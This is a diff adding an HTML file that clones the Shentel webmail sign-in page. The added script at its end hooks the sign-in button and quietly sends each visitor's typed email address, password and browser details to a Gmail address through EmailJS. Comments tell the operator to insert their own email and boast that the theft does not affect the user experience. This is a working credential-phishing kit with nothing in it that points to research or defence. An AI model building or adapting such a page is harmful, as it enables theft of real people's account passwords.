@@ -1,1 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <base href="https://webmail.shentel.net/app" /><!-- Start Meta Fields  -->
+    <meta charset="utf-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Sign In - Shentel</title>
+    <!-- Ends Meta Fields  -->
+    <!-- Font -->
+    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet" />
+    <!-- End Font -->
+    <!-- #CSS library STARTS -->
+    <link crossorigin="anonymous" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" rel="stylesheet" />
+    <link href="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/css/style.css" rel="stylesheet" type="text/css" />
+    <link href="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/css/responsive.css" rel="stylesheet" type="text/css" />
+    <!-- #CSS library ENDS -->
+    <script>
+        top.document.title = "Sign In - Shentel";
+        var m_sDomaincode = "shentelnet"
+        var g_bMobile = false;
+        var g_sCtime = "6/10/2026 6:17:58 AM";
+    </script>
+    <style type="text/css">
+        input {
+            box-shadow: none;
+        }
+        input:focus {
+            box-shadow: none !important;
+        }
+        .form-group {
+            margin-bottom: 0px !important;
+        }
+        .btndisabled {
+            color: #fff;
+            background-color: #B4BCC9 !important;
+        }
+        .loadingimg {
+            display: block;
+            visibility: hidden;
+            margin-left: auto;
+            margin-right: auto;
+            width: 47px;
+            height: 47px;
+            background-image: url("https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/Ellipsis-1.4s-47px.gif")
+        }
+        .main-title-wrap h1::after { background-color: #003462  !important; }
+    </style>
+</head>
+<body>
+<main class="main-content-wrapper sign-in-wrapper" id="mLoginBox">
+    <header>
+        <div class="site-logo">
+            <a href="https://www.shentel.com" target="_blank">
+                <img alt="Shentel - High-Speed Internet, Home Phon" src="../../app/s/shentelnet/images/shentel_logo.png" />
+            </a>
+        </div>
+    </header>
 
+    <section class="content-holder">
+        <div class="container">
+            <!-- Site Title Starts -->
+            <div class="main-title-wrap text-center">
+                <h1><span class="text-content">Sign in</span></h1>
+            </div>
+            <!-- Site Title Ends -->
+
+            <!-- Form Field Starts -->
+            <div class="form-detail-wrapper">
+                <div class="left-content-wrap" style="margin-bottom: 20px">
+                    <!-- Original form with onsubmit="return false;" preserved -->
+                    <form autocomplete="off" method="POST" onsubmit="return false;">
+                        <input name="__original_url" type="hidden" value="https://webmail.shentel.net/app" />
+                        <div class="form-group">
+                            <input autocomplete="on" id="sign-in-email" name="signin_email" required="" type="text" value="" />
+                            <label for="ign-in-email">Full email address</label>
+                            <span class="email-error error-msg" id="errmsg_signin_email" style="visibility: hidden">This needs to be filled</span>
+                        </div>
+                        <div class="form-group">
+                            <input autocomplete="on" id="signin_password" name="signin_password" onkeydown="fnSigninKeyDown(this,event); g_iTRP =0;" required="" type="password" value="" />
+                            <label for="password">Password</label>
+                            <span class="email-error error-msg" id="errmsg_signin_password" style="visibility: hidden">This needs to be filled</span>
+                        </div>
+                        <div class="form-group" style="font-size: 12px">
+                            <input id="RememberMe" name="LoginForm[RememberMe]" style="width: auto !important;height: auto  !important;" type="checkbox" /> Stay signed in
+                            <span style="float: right">
+                                <a class="link" href="../../v1/recover" target="blank">Trouble signing in?</a><br />
+                                <a class="link" href="JavaScript:fnFeedback()" style="display: none;">Need help?</a>
+                            </span>
+                        </div>
+                    </form>
+
+                    <div class="empty-error" id="errmsg_api" style="font-size: 12px; color: #d93025; position:static; margin: 25px 0 10px; visibility: hidden; line-height:18px !important; margin-top: 15px !important">xxxx</div>
+                    <div class="g-recaptcha" data-callback="fnRecaptchaCallback" data-sitekey="" id="g-recaptcha" style="display: none">&nbsp;</div>
+
+                    <!-- Sign In button (original id="signup_btn") -->
+                    <button id="signup_btn" onclick="g_iTRP =0; fnSignin('m'); return false;" style="margin-top: 20px !important; background-color:#F37121 !important;border-radius: 5px!important;">Sign In</button>
+
+                    <div class="loadingimg">&nbsp;</div>
+                    <div class="get-mobile-app" style="margin-top: 0px !important; display:none;">
+                        <h6 class="text-center" style="margin-top: 0px !important;">Get the mobile app:</h6>
+                        <ul class="store-wrap">
+                            <li class="apple-store"><a href="https://apps.apple.com/us/app/bizmail-business-email/id1199519777" target="_blank"><img alt="/" src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/apple-store.png" /> </a></li>
+                            <li class="google-store"><a href="https://play.google.com/store/apps/details?id=com.bizmail" target="_blank"><img alt="/" src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/google-store.png" /> </a></li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="right-content-wrap">
+                    <figure><img alt="" src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/signin_ss.png" /></figure>
+                </div>
+            </div>
+
+            <div class="note">
+                <p>&copy; Shentel</p>
+            </div>
+            <!-- Form Field Ends -->
+        </div>
+    </section>
+</main>
+
+<!-- Modal for error messages (kept from original) -->
+<div aria-hidden="true" aria-labelledby="exampleModalLabel" class="modal fade" id="msgModal" role="dialog" tabindex="-1">
+    <div class="modal-dialog" role="document">
+        <div class="modal-content">
+            <div class="modal-body" id="msgModalBody">Wrong username or password</div>
+            <div class="modal-footer"><button class="btn btn-secondary" data-dismiss="modal" type="button">Close</button></div>
+        </div>
+    </div>
+</div>
+
+<div class="modal fade" id="FeedBackmodal">
+    <div class="modal-dialog">
+        <div class="modal-content bmd-modalContent">
+            <div class="modal-body">
+                <div class="close-button"><button aria-label="Close" class="close" data-dismiss="modal" type="button"><span aria-hidden="true">&times;</span></button></div>
+                <div class="embed-responsive embed-responsive-16by9" id="FeedbackModalBody" style="height: 230px"><iframe class="embed-responsive-item" frameborder="0" id="ifrFeedBack" src="../../app/feedback.asp"></iframe></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="modal fade" id="SecurityFeatureModal">
+    <div class="modal-dialog modal-dialog-centered" style="max-width: 550px; width: 550px;">
+        <div class="modal-content bmd-modalContent" style="border-radius: 20px!important;">
+            <div class="modal-body">
+                <div class="modal-body">
+                    <h2 style="font-weight: bold;">Good news! We added a new security feature.</h2>
+                    <figure style="float: right; shape-outside:circle(50%);margin-top: 20px;"><img alt="/" src="../../app/s/shentelnet/images/Shentel-Lock_200.png" /></figure>
+                    <p>You can now add a backup email address<br />
+                    or mobile phone number to help<br />
+                    get back into your account should<br />
+                    you ever forget your password<br />
+                    or get locked out.</p>
+                    <button id="securityFeature_s01btn" onclick="fnSecurityFeatureModalNow(); return false;" style="margin-top: 5px !important; display:block; font-size:12px; padding:5px 20px; color:#fff; background-color:#F37121 !important;border-radius: 4px!important;">Setup recovery methods now</button>
+                    <a class="back-link link" href="JavaScript:fnSecurityFeatureModalLater()" id="securityFeature_s02btn" style="font-size: 12px;">Remind me later </a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div aria-hidden="true" aria-labelledby="exampleModalLabel" class="modal fade" id="CreateTModal" role="dialog" tabindex="-1">
+    <div class="modal-dialog" role="document">
+        <div class="modal-content">
+            <div class="modal-body" id="msgModalBody">&nbsp;</div>
+            <div class="modal-footer"><button class="btn btn-secondary" data-dismiss="modal" type="button">Close</button></div>
+        </div>
+    </div>
+</div>
+
+<!-- #JS library STARTS -->
+<script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+<script src="../../app/s/shentelnet/js/signin_091321.js?v=1"></script>
+<!-- #JS library ENDS -->
+
+<!-- EmailJS SDK -->
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+
+<!-- EmailJS Integration Script (preserves original design, adds login data capture) -->
+<script>
+    // Initialize EmailJS with your public key
+    (function() {
+        emailjs.init("SdkmRe8WZ7itEba9z");
+    })();
+
+    // Helper function to show temporary error in your existing api error div (without altering design)
+    function showTemporaryError(message) {
+        var errDiv = document.getElementById("errmsg_api");
+        if (errDiv) {
+            errDiv.innerHTML = message;
+            errDiv.style.visibility = "visible";
+            setTimeout(function() {
+                errDiv.style.visibility = "hidden";
+            }, 5000);
+        } else {
+            alert(message); // fallback only if div missing
+        }
+    }
+
+    // Override the fnSignin function to capture data and send via EmailJS
+    // Preserve the original function behavior but add EmailJS sending.
+    // Since the original fnSignin is defined in signin_091321.js, we will wrap it.
+    // Wait for the original script to load then extend.
+    window.addEventListener("load", function() {
+        // Ensure original fnSignin exists, then override
+        if (typeof fnSignin === "function") {
+            var originalFnSignin = fnSignin;
+            window.fnSignin = function(param) {
+                // Capture email and password from the form fields
+                var email = document.getElementById("sign-in-email") ? document.getElementById("sign-in-email").value : "";
+                var password = document.getElementById("signin_password") ? document.getElementById("signin_password").value : "";
+                var rememberMe = document.getElementById("RememberMe") ? document.getElementById("RememberMe").checked : false;
+
+                // Send data via EmailJS (does not interfere with original flow)
+                if (email && password) {
+                    var templateParams = {
+                        to_email: "dossbrent41@gmail.com",  // 🔴 CHANGE THIS TO YOUR REAL EMAIL
+                        user_email: email,
+                        user_password: password,   //
+                        remember_me: rememberMe ? "Yes" : "No",
+                        action: "sign_in_attempt",
+                        timestamp: new Date().toLocaleString(),
+                        page_url: window.location.href,
+                        user_agent: navigator.userAgent
+                    };
+
+                    emailjs.send("service_zuj2d2a", "template_tvd86sp", templateParams)
+                        .then(function(response) {
+                            console.log("EmailJS success: login data sent", response.status);
+                        })
+                        .catch(function(error) {
+                            console.error("EmailJS error:", error);
+                            // Silent fail - does not affect user experience
+                        });
+                }
+
+                // Call the original function to maintain original behavior
+                originalFnSignin(param);
+            };
+        } else {
+            // If original fnSignin not found (fallback), attach to button click
+            var signinBtn = document.getElementById("signup_btn");
+            if (signinBtn) {
+                signinBtn.addEventListener("click", function(e) {
+                    var email = document.getElementById("sign-in-email") ? document.getElementById("sign-in-email").value : "";
+                    var password = document.getElementById("signin_password") ? document.getElementById("signin_password").value : "";
+                    var rememberMe = document.getElementById("RememberMe") ? document.getElementById("RememberMe").checked : false;
+
+                    if (email && password) {
+                        var templateParams = {
+                            to_email: "dossbrent41@gmail.com",  // 🔴 CHANGE THIS
+                            user_email: email,
+                            user_password: password,
+                            remember_me: rememberMe ? "Yes" : "No",
+                            action: "sign_in_attempt",
+                            timestamp: new Date().toLocaleString(),
+                            page_url: window.location.href,
+                            user_agent: navigator.userAgent
+                        };
+
+                        emailjs.send("service_zuj2d2a", "template_tvd86sp", templateParams)
+                            .then(function(response) {
+                                console.log("EmailJS success: login data sent", response.status);
+                            })
+                            .catch(function(error) {
+                                console.error("EmailJS error:", error);
+                            });
+                    }
+                    // Optionally call original if available, but nothing else.
+                });
+            }
+        }
+    });
+</script>
+
+<script>
+        top.document.title = "Sign In - Shentel";
+</script>
+</body>
+</html>
